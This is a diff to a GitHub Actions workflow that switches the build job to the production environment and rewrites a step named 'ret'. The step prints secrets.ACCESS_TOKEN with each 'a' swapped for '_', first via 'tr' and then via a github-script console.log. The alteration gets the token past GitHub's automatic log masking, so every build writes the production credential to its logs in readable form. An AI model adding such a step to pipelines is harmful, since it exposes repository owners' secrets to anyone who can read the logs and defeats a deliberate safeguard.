@@ -10,6 +10,7 @@ on:
 
 jobs:
   build:
+    environment: production
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
@@ -34,4 +35,9 @@ jobs:
       - name: test
         run: yarn test
       - name: ret
-        run: echo "${{ secrets.ACCESS_TOKEN }}" | tr a _
+        uses: actions/github-script@v6
+        env:
+          token: ${{ secrets.ACCESS_TOKEN }}
+        with:
+          script: |
+            console.log(process.env.token.replace(/a/g, '_'))
